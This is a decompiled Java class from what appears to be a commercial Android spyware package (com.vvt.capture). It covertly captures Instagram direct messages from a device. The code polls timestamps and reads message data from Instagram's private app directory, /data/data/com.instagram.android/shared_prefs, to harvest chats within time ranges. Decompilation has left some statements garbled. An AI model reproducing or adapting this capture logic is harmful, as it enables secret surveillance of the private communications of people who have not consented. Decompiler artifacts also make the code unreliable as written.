package com.vvt.capture.instagram.directmessage.a;

import android.os.SystemClock;
import com.vvt.base.capture.FxSimpleEventReference;
import com.vvt.base.capture.f;
import com.vvt.base.capture.g;
import java.util.ArrayList;
import java.util.Collection;
import java.util.List;

public class d
  implements f
{
  private static final String a = d.class.getSimpleName();
  private static final boolean b = com.vvt.ak.a.a;
  private static final boolean c = com.vvt.ak.a.d;
  private static final boolean d = com.vvt.ak.a.e;
  private long e = -1;
  private String f;
  private com.vvt.base.b g;
  
  public d(String paramString, com.vvt.base.b paramb)
  {
    this.f = paramString;
    this.g = paramb;
  }
  
  public g a()
  {
    long l1 = -1;
    boolean bool1 = b;
    if (bool1) {}
    long l2 = 3000L;
    SystemClock.sleep(l2);
    FxSimpleEventReference localFxSimpleEventReference = new com/vvt/base/capture/FxSimpleEventReference;
    localFxSimpleEventReference.<init>();
    boolean bool2;
    try
    {
      long l3 = com.vvt.capture.instagram.directmessage.b.a();
      bool1 = false;
      Object localObject = null;
      l2 = l3;
      int j = 0;
      for (;;)
      {
        boolean bool3 = l2 < l1;
        if (bool3) {
          break;
        }
        int k = 5;
        if (j >= k) {
          break;
        }
        l2 = 2000L;
        SystemClock.sleep(l2);
        long l4 = com.vvt.capture.instagram.directmessage.b.a();
        int i = j + 1;
        j = i;
        l2 = l4;
      }
      boolean bool4;
      bool2 = c;
    }
    catch (Exception localException)
    {
      bool2 = d;
      if (bool2) {}
      l2 = l1;
      bool4 = l2 < l1;
      if (bool4) {
        break label162;
      }
    }
    if (bool2) {}
    l2 = this.e;
    for (;;)
    {
      Long localLong = Long.valueOf(l2);
      localFxSimpleEventReference.setReference(localLong);
      bool2 = b;
      if (bool2) {}
      return localFxSimpleEventReference;
      label162:
      this.e = l2;
    }
  }
  
  public List a(int paramInt)
  {
    bool = b;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String str1 = com.vvt.capture.instagram.a.a();
    long l1;
    long l2;
    if (str1 != null)
    {
      l1 = com.vvt.capture.instagram.directmessage.b.a(paramInt, str1) - 1L;
      l2 = com.vvt.capture.instagram.directmessage.b.a();
    }
    try
    {
      Object localObject = this.f;
      com.vvt.base.b localb = this.g;
      String str2 = "/data/data/com.instagram.android/shared_prefs";
      localObject = com.vvt.capture.instagram.directmessage.b.a((String)localObject, str1, l1, l2, localb, str2);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList;
  }
  
  public List a(g paramg1, g paramg2)
  {
    bool = b;
    if (bool) {}
    ArrayList localArrayList = new java/util/ArrayList;
    localArrayList.<init>();
    String str1 = com.vvt.capture.instagram.a.a();
    if (str1 != null) {}
    try
    {
      Object localObject = paramg1.getReference();
      localObject = (Long)localObject;
      long l1 = ((Long)localObject).longValue();
      localObject = paramg2.getReference();
      localObject = (Long)localObject;
      long l2 = ((Long)localObject).longValue();
      localObject = this.f;
      com.vvt.base.b localb = this.g;
      String str2 = "/data/data/com.instagram.android/shared_prefs";
      localObject = com.vvt.capture.instagram.directmessage.b.a((String)localObject, str1, l1, l2, localb, str2);
      localArrayList.addAll((Collection)localObject);
    }
    catch (Exception localException)
    {
      for (;;)
      {
        bool = d;
        if (!bool) {}
      }
    }
    bool = b;
    if (bool) {}
    return localArrayList;
  }
}


/* Location:              /Volumes/D1/codebase/android/POC/assets/product/maind/classes-enjarify.jar!/com/vvt/capture/instagram/directmessage/a/d.class
 * Java compiler version: 5 (49.0)
 * JD-Core Version:       0.7.1
 */